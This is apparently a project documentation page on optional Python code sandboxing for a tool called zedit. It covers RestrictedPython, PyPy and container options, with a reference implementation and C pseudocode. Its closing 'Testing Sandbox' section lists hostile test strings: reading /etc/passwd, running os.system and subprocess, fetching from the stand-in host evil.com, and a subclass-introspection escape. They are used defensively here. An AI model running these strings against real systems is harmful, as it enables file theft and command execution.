# Optional Python Code Sandboxing

This document describes how to enable optional Python code sandboxing using RestrictedPython.

## Overview

By default, zedit executes Python code without restrictions. For enhanced security in untrusted environments, you can optionally enable code sandboxing using RestrictedPython.

## Sandboxing Options

### Option 1: RestrictedPython (Recommended for Production)

RestrictedPython provides compile-time restrictions on Python code execution.

**Installation:**
```bash
pip install RestrictedPython
```

**Features:**
- Restricts imports to safe modules only
- Prevents file system access
- Blocks dangerous builtins (eval, exec, compile, etc.)
- No subprocess execution
- Limited attribute access

**Limitations:**
- Compile-time only (not runtime)
- May break some legitimate use cases
- Requires careful whitelist management

### Option 2: PyPy Sandboxing

PyPy provides OS-level sandboxing with system call interception.

**Installation:**
```bash
# Install PyPy
brew install pypy  # macOS
apt install pypy3  # Linux
```

**Features:**
- OS-level isolation
- System call filtering
- Resource limits (CPU, memory)

**Limitations:**
- Significant performance overhead
- Complex configuration
- Not available on all platforms

### Option 3: Docker/Container Isolation (Best Security)

Run the entire zedit external in a containerized environment.

**Example:**
```dockerfile
FROM python:3.11-slim
RUN pip install RestrictedPython
COPY zedit /app/zedit
RUN useradd -m sandbox
USER sandbox
WORKDIR /app
CMD ["./zedit"]
```

**Features:**
- Complete OS isolation
- Resource limits
- Network isolation
- File system restrictions

## Implementation Example: RestrictedPython

Here's a reference implementation for integrating RestrictedPython:

```python
# sandbox_helper.py
from RestrictedPython import compile_restricted, safe_globals
from RestrictedPython.Guards import safe_builtins, guarded_iter_unpack_sequence

# Safe globals - customize as needed
SAFE_GLOBALS = {
    '__builtins__': safe_builtins,
    '_iter_unpack_sequence_': guarded_iter_unpack_sequence,
    # Add allowed modules here
    'math': __import__('math'),
    'random': __import__('random'),
    # Prevent dangerous operations
    '__import__': None,
    'open': None,
    'eval': None,
    'exec': None,
    'compile': None,
}

def execute_sandboxed(code: str) -> dict:
    """
    Execute Python code in a restricted environment.

    Args:
        code: Python code to execute

    Returns:
        dict with 'success', 'result', and 'error' keys
    """
    try:
        # Compile with restrictions
        byte_code = compile_restricted(
            code,
            filename='<sandboxed>',
            mode='exec'
        )

        if byte_code.errors:
            return {
                'success': False,
                'error': 'Compilation errors: ' + ', '.join(byte_code.errors)
            }

        # Execute in restricted environment
        result_globals = SAFE_GLOBALS.copy()
        exec(byte_code.code, result_globals)

        return {
            'success': True,
            'result': result_globals,
            'error': None
        }

    except Exception as e:
        return {
            'success': False,
            'error': str(e)
        }

# Example usage
if __name__ == '__main__':
    # Safe code - should work
    safe_code = """
x = 10
y = 20
result = x + y
print(f"Result: {result}")
"""

    # Unsafe code - should be blocked
    unsafe_code = """
import os
os.system('ls')  # Blocked!
"""

    print("Testing safe code:")
    print(execute_sandboxed(safe_code))

    print("\nTesting unsafe code:")
    print(execute_sandboxed(unsafe_code))
```

## Integration with zedit

To integrate sandboxing with zedit, you would:

1. **Modify zedit.c** to call Python sandboxing functions before execution
2. **Add error handling** for sandbox violations
3. **Configure whitelist** of allowed modules and operations
4. **Test thoroughly** to ensure legitimate code still works

**Example C integration (pseudocode):**

```c
#ifdef ENABLE_SANDBOXING

// Initialize sandbox on startup
int zedit_init_sandbox(t_zedit* x) {
    // Import sandbox_helper module
    PyObject* module = PyImport_ImportModule("sandbox_helper");
    if (module == NULL) {
        error("Failed to load sandboxing module");
        return -1;
    }

    x->sandbox_func = PyObject_GetAttrString(module, "execute_sandboxed");
    return 0;
}

// Execute code through sandbox
t_max_err zedit_exec_sandboxed(t_zedit* x, const char* code) {
    PyObject* result = PyObject_CallFunction(
        x->sandbox_func,
        "s",
        code
    );

    if (result == NULL) {
        error("Sandbox execution failed");
        return MAX_ERR_GENERIC;
    }

    // Check if execution was successful
    PyObject* success = PyDict_GetItemString(result, "success");
    if (success == Py_False) {
        PyObject* error = PyDict_GetItemString(result, "error");
        const char* error_msg = PyUnicode_AsUTF8(error);
        post("Sandbox error: %s", error_msg);
        return MAX_ERR_GENERIC;
    }

    return MAX_ERR_NONE;
}

#endif
```

## Security Considerations

**Even with sandboxing:**
- Always run on localhost only (already configured)
- Use authentication tokens (already implemented)
- Apply rate limiting (already implemented)
- Keep Python and dependencies updated
- Monitor execution logs
- Set resource limits (CPU, memory, time)

**Sandboxing is not a silver bullet:**
- Determined attackers may find bypasses
- Zero-day vulnerabilities in Python/RestrictedPython
- Side-channel attacks
- Denial of service through resource exhaustion

## Recommendations

1. **Development**: No sandboxing needed (localhost, trusted user)
2. **Production (trusted users)**: Authentication + rate limiting (already implemented)
3. **Production (untrusted users)**: Full sandboxing + container isolation
4. **High security**: Don't allow arbitrary code execution at all

## Testing Sandbox

Test your sandbox configuration with these attack vectors:

```python
# Test cases for sandbox
test_cases = [
    # File access
    "open('/etc/passwd').read()",
    "import os; os.listdir('/')",

    # Network access
    "import socket; socket.socket()",
    "import urllib; urllib.request.urlopen('http://evil.com')",

    # Process execution
    "import subprocess; subprocess.run(['ls'])",
    "import os; os.system('whoami')",

    # Import restrictions
    "import sys; sys.exit()",
    "__import__('os').system('ls')",

    # Eval/exec bypass
    "eval('print(1)')",
    "exec('import os')",

    # Introspection attacks
    "().__class__.__bases__[0].__subclasses__()",
]

for test in test_cases:
    result = execute_sandboxed(test)
    assert not result['success'], f"SECURITY FAILURE: {test}"
```

## Further Reading

- [RestrictedPython Documentation](https://restrictedpython.readthedocs.io/)
- [OWASP Sandboxing Guide](https://owasp.org/www-community/controls/Sandbox)
- [Python Security Best Practices](https://python.readthedocs.io/en/stable/library/security_warnings.html)
